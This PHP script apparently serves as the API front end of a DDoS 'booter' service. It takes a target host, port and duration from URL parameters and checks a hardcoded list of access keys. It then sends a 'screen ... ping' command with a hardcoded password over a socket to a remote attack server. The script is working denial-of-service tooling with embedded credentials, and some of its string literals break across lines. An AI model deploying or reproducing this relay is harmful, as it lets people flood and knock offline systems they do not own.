<?php

//Get Variables
$t13r_host = escapeshellcmd($_GET['host']);
$t13r_port = escapeshellcmd($_GET['port']);
$time = escapeshellcmd($_GET['time']);

//Check Key
$key = explode(",","keytwo,foxel,fitz123qwe");
if (!in_array($_GET['key'],$key)){
print "Wrong Key.";
die();
}

//Connection Variables
$secretKey = "t13rpassword";
$host = "1.1.1.1";
$port = 81;

#Packet Send (Script Run + Time)
$output = "screen -dmS ertu ping '".$t13r_host."' '".$t13r_port."' -t '".$time."'";
print $output;
$koutput = $secretKey.",".$output;

#Send Packet over Socket
$socket1 = socket_create(AF_INET, SOCK_STREAM,0) or die("Could not create sock
\n");
socket_connect ($socket1 , $host,$port ) ;
socket_write($socket1, $koutput, strlen ($koutput)) or die("Could not write ou
ut\n");
socket_close($socket1) ;


?>
